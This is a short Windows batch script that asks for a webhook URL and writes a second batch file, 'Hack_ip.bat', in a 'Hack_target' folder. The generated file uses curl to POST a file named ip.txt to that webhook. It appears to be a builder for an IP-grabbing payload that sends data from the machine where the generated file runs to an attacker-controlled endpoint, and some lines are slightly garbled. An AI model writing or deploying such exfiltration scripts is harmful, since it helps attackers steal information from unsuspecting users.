@echo off
color c
SET /p webhook=" webhook >  "
cd Hack_target
echo -hack >> Hack_ip.bat
echo curl -X POST -F "file=@ip.txt-hack" "%webhook%" >>Hack_ip.bat
exit